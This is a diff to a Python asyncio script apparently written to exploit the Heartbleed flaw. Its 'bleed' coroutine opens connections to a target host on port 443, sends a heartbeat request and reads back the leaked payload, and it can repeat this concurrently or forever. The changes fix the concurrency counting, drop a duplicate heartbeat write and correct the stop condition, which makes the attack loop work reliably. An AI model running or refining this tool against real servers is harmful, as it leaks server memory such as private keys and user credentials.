@@ -119,9 +119,11 @@ def recvMessage(reader):
 
 @asyncio.coroutine
 def bleed(host, port = 443, concurrency = 1, forever = False):
+	# init, increase active count
 	global active
+	active += 1
+
 	if active < concurrency:
-		active += 1
 		asyncio.async(bleed(host, port, concurrency, forever))
 
 	reader, writer = yield from asyncio.open_connection(host, port, loop = loop)
@@ -139,7 +141,6 @@ def bleed(host, port = 443, concurrency = 1, forever = False):
 			break
 
 	logging.info('Sending heartbeat request...')
-	writer.write(heartbeat)
 	writer.write(heartbeat)
 
 	typ, ver, payload = yield from recvMessage(reader)
@@ -160,13 +161,13 @@ def bleed(host, port = 443, concurrency = 1, forever = False):
 	else:
 		logging.error('Unknown response type')
 
+	# Done, check for next task
+	active -= 1
 	if forever:
 		if active < concurrency:
 			asyncio.async(bleed(host, port, concurrency, forever))
-		else:
-			active -= 1
 	else:
-		if active == 1:
+		if active == 0:
 			loop.stop()
 
 if __name__ == '__main__':
